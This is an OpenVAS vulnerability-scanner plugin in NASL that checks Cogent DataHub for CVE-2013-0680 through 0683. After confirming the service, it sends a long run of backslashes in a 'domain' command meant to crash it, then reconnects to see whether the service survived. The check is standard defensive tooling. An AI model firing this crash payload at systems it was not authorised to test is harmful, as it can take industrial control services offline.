if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803491" );
	script_version( "$Revision: 11865 $" );
	script_cve_id( "CVE-2013-0680", "CVE-2013-0681", "CVE-2013-0682", "CVE-2013-0683" );
	script_bugtraq_id( 58902, 58910, 58905, 58909 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2013-04-16 11:21:21 +0530 (Tue, 16 Apr 2013)" );
	script_name( "Cogent DataHub Multiple Vulnerabilities" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (c) 2013 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 4502, 4600 );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52945" );
	script_xref( name: "URL", value: "http://www.cogentdatahub.com/ReleaseNotes.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  arbitrary code or cause denial of service condition resulting in
  loss of availability." );
	script_tag( name: "affected", value: "Cogent DataHub before 7.3.0, OPC DataHub before 6.4.22,
  Cascade DataHub before 6.4.22 on Windows, and
  DataHub QuickTrend before 7.3.0" );
	script_tag( name: "insight", value: "Multiple flaws due to

  - Improper handling of formatted text commands

  - Improper validation of HTTP request with a long header parameter

  - Error within string handling" );
	script_tag( name: "solution", value: "Upgrade to Cogent DataHub 7.3.0, OPC DataHub 6.4.22,
  Cascade DataHub 6.4.22, DataHub QuickTrend 7.3.0 or later." );
	script_tag( name: "summary", value: "The host is running Cogent DataHub and is prone to multiple
  vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
dataPort = 4502;
if(!get_port_state( dataPort )){
	dataPort = 4600;
	if(!get_port_state( dataPort )){
		exit( 0 );
	}
}
soc = open_sock_tcp( dataPort );
if(!soc){
	exit( 0 );
}
req = NASLString( "(domain \"openvas-test\")", raw_string( 0x0a ) );
send( socket: soc, data: req );
res = recv( socket: soc, length: 1024 );
if(!ContainsString( res, "success \"domain\" \"openvas-test\"" )){
	exit( 0 );
}
attack = crap( data: "\\\\", length: 512 );
req = NASLString( "domain ", attack, "\r\n" );
send( socket: soc, data: req );
res = recv( socket: soc, length: 1024 );
close( soc );
sleep( 1 );
soc = open_sock_tcp( dataPort );
if(!soc){
	security_message( dataPort );
	exit( 0 );
}
req = NASLString( "(domain \"openvas-test\")", raw_string( 0x0a ) );
send( socket: soc, data: req );
res = recv( socket: soc, length: 1024 );
if(!ContainsString( res, "success \"domain\" \"openvas-test\"" )){
	security_message( dataPort );
}
close( soc );

